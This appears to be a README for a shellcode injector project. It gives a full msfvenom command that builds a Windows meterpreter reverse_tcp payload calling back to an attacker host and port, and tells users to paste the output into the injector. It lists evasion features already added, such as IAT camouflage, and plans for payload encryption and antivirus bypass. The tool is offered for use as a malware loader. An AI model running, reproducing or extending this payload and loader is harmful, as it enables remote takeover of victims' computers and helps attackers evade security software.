# Shellcode Injector
### instructions
1. Gen your msfvenom shellcode :
`msfvenom -platform windows --arch x64 -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.67 LPORT=4444 -f c --var-name=wannabe`
2. Put your shellcode in the `wannabe` variable.

### UPDATES 
- Added IAT camouflage
- Added Force loading kernel32.dll
- More to come.. need to bypass runtime...

### To do
- Add payload encryption and decryption
- Get shellcode from exe file and saving it in the var
- UI
- Bypass execution AV

### Warning
This does not bypass AV as of now, we did not implement anything for it. If you want to contribute and add it, feel  free to do so.
This is simply to play with memory allocation and execution. 
